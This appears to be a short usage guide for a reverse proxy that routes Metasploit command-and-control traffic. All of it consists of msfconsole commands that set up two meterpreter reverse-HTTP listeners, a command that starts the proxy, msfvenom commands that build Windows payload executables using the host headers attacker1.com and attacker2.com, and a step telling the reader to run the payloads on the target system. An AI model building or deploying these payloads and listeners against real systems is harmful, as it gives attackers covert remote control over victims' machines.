1-Create the listeners binded to the reverse proxy:
```
 msfconsole
 > use exploit/multi/handler
 > set payload windows/meterpreter_reverse_http
 > set LHOST 172.17.0.1
 > set LPORT 80
 > set ReverseListenerBindAddress 172.17.0.1
 > set ReverseListenerBindPort 8000
 > exploit -j -z
```

```
 msfconsole
 > use exploit/multi/handler
 > set payload windows/meterpreter_reverse_http
 > set LHOST 172.17.0.1
 > set LPORT 80
 > set ReverseListenerBindAddress 172.17.0.1
 > set ReverseListenerBindPort 9000
 > exploit -j -z
```

2-Execute the reverse proxy:

 sudo go run main.go

3-Create the payloads using msfvenom:

msfvenom -p windows/meterpreter_reverse_http LHOST=172.17.0.1 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe

msfvenom -p windows/meterpreter_reverse_http LHOST=172.17.0.1 LPORT=80 HttpHostHeader=attacker2.com -f exe -o payload2.exe

4-In the target system execute the payloads

Change the payload, LHOST, LPORT, ReverseBindPort and ReverseBindAddress to convenience
